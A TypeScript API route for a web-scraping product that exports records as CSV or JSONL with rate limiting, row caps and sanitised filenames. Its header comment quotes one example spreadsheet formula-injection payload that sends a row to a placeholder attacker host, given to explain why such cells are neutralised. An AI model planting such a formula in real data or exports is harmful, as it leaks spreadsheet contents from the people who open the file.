import { toCsv, toJsonl } from '@webscraper/shared';
import { intParam, route } from '@/lib/api';
import { enforceRateLimit } from '@/lib/rate-limit';
import { getStore } from '@/lib/store';

/**
 * CSV / JSONL export.
 *
 * Exports are the highest-risk output path in the product, because a CSV gets
 * opened in Excel:
 *
 *  - **Formula injection is neutralised** in `toCsv` (cells starting with
 *    `= + - @ TAB CR` are prefixed with an apostrophe). The values came from an
 *    untrusted page, so `=HYPERLINK("http://attacker/?"&A1)` in a product name
 *    would otherwise exfiltrate the row on open.
 *  - **Content-Disposition uses a sanitised filename**, so a job name cannot
 *    inject headers or path separators.
 *  - **The row count is capped** and reported, so a client cannot ask for a
 *    million rows and hold a connection for a minute.
 */

const MAX_EXPORT_ROWS = 50_000;

function safeFilename(name: string, extension: string): string {
  const base = name
    .normalize('NFKD')
    .replace(/[^\w\-. ]+/g, '')
    .trim()
    .replace(/\s+/g, '-')
    .slice(0, 80) || 'export';
  const stamp = new Date().toISOString().slice(0, 10);
  return `${base}-${stamp}.${extension}`;
}

export const GET = route(async (request) => {
  const store = await getStore();
  const context = await store.getOrgContext();
  const url = new URL(request.url);

  await enforceRateLimit(`export:${context.org.id}`, { max: 20, windowMs: 60_000 });

  const format = url.searchParams.get('format') === 'jsonl' ? 'jsonl' : 'csv';
  const jobId = url.searchParams.get('jobId') ?? undefined;
  const search = url.searchParams.get('q')?.trim().slice(0, 200) || undefined;
  const changedOnly = url.searchParams.get('changed') === '1';
  const requested = intParam(url.searchParams.get('limit'), 10_000, 1, MAX_EXPORT_ROWS);

  // Page through the store rather than asking for everything at once.
  const rows: Array<Record<string, unknown>> = [];
  const pageSize = 200;
  let page = 1;
  let truncated = false;

  while (rows.length < requested) {
    const result = await store.listRecords({ jobId, search, changedOnly, page, pageSize, sort: 'newest' });
    for (const record of result.items) {
      const merged: Record<string, unknown> = { ...record.data };
      if (record.enriched) {
        // Enrichment is namespaced so it can never shadow an extracted field.
        for (const [key, value] of Object.entries(record.enriched)) merged[`ai_${key}`] = value;
      }
      merged.source_url = record.source_url ?? '';
      merged.first_seen_at = record.first_seen_at;
      merged.last_seen_at = record.last_seen_at;
      merged.changed = record.is_changed;
      rows.push(merged);
      if (rows.length >= requested) break;
    }
    if (!result.hasMore) break;
    page += 1;
    if (rows.length >= requested) {
      truncated = true;
      break;
    }
  }

  await store.recordUsage({ kind: 'export', quantity: rows.length, unitCostUsd: 0, jobId: jobId ?? null, metadata: { format } });

  const job = jobId ? await store.getJob(jobId) : null;
  const filename = safeFilename(job?.name ?? 'webscraper-export', format === 'csv' ? 'csv' : 'jsonl');

  if (format === 'jsonl') {
    return new Response(toJsonl(rows), {
      headers: {
        'content-type': 'application/x-ndjson; charset=utf-8',
        'content-disposition': `attachment; filename="${filename}"`,
        'cache-control': 'no-store',
        'x-export-rows': String(rows.length),
        'x-export-truncated': truncated ? '1' : '0',
      },
    });
  }

  // Prefix a UTF-8 BOM so Excel opens non-ASCII values correctly.
  const csv = `\ufeff${toCsv(rows)}`;
  return new Response(csv, {
    headers: {
      'content-type': 'text/csv; charset=utf-8',
      'content-disposition': `attachment; filename="${filename}"`,
      'cache-control': 'no-store',
      'x-export-rows': String(rows.length),
      'x-export-truncated': truncated ? '1' : '0',
    },
  });
});
